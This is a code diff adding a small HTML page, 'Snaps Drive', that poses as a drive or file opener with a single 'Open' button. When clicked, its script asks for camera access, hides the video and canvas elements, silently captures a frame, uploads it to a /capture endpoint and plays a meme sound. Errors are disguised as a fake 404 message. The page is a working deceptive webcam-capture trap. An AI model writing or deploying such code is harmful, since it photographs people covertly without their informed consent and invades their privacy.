@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Snaps Drive</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      margin: 0;
+      background-color: black;
+      color: white;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      text-align: center;
+    }
+    #startButton {
+      padding: 15px 30px;
+      font-size: 18px;
+      border: none;
+      border-radius: 10px;
+      background-color: red;
+      color: white;
+      margin-top: 20px;
+    }
+    video, canvas {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <h1>Snaps Drive</h1>
+  <p></p>
+  <button id="startButton">Open</button>
+
+  <video id="video" autoplay></video>
+  <canvas id="canvas"></canvas>
+  <audio id="memeAudio" src="/static/meme_ram.mp4"></audio>
+
+  <script>
+    const startButton = document.getElementById("startButton");
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
+    const memeAudio = document.getElementById("memeAudio");
+
+    startButton.addEventListener("click", async () => {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+
+        // Wait for camera to warm up
+        setTimeout(() => {
+          const context = canvas.getContext("2d");
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+          // Convert to blob and send to server
+          canvas.toBlob(blob => {
+            const formData = new FormData();
+            formData.append("photo", blob, "capture.jpg");
+            fetch("/capture", { method: "POST", body: formData });
+          }, "image/jpeg");
+
+          memeAudio.play();
+        }, 1000); // 1 second delay
+
+      } catch (error) {
+        alert(" 404 ERROR  " + error.message);
+      }
+    });
+  </script>
+</body>
+</html>
